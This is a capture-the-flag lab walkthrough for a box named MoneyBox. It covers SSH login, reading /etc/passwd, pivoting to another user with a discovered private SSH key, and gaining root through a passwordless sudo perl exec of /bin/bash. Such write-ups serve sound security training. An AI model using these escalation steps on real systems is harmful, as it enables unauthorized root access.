With the username `renu` and the password `987654321`, SSH into the target machine.

```
$ ssh renu@192.168.0.7
```

And we find our first flag in the `user1.txt` file!.

Now, let us find any way to get to the root user of this machine. First, find out how many users are present in the system.

```
renu@MoneyBox:~$ cat /etc/passwd | grep -iE "sh|bash|zsh"
```

![[Pasted image 20231120154739.png]]

We see that we have more users, `lily` and `root` in the sytem.

Browse to `lily`'s user directory located `/home/lily`

```
renu@MoneyBox:~$ cd /home/lily/
```

Here, we found the 2nd Flag!!!

Looking inside of the `.ssh` folder of `lily`, we can see `authorized_keys` of ssh.

![[Pasted image 20231120155432.png]]

The user `renu` is authorized for the ssh keys. So if we go back to `renu`'s home directory and look at the `bash history` of the commands, we see that, indeed the user had access to `lily`'s SSH ID.

```
grep "ssh" -i .bash_history --color=auto
```

![[Pasted image 20231120161028.png]]

Go to `renu`'s `.ssh` folder, in there we find the rsa id for our SSH login.

![[Pasted image 20231120161205.png]]

Using the command same command of `renu`, SSH into the user `lily`.

```
ssh -i id_rsa lily@127.0.0.1
```

![[Pasted image 20231120161316.png]]

List for the privileges that the user `lily` has.

```
lily@MoneyBox:~$ sudo -l
```

![[Pasted image 20231120161627.png]]

So, this means that, we don't have to use password if we are using `sudo` command if you are using the `perl` tool.

Our intension is to become the root or get access to `root`'s shell. If we can run the `/bin/bash` file with the root access, we become the root.

For that, using `perl`, execute the `/bin/bash` file.

```
lily@MoneyBox:~$ sudo perl -e 'exec "/bin/bash"'
```

![[Pasted image 20231120163255.png]]

Now that we are a root user, finding the flag at root's directory is a cake walk.
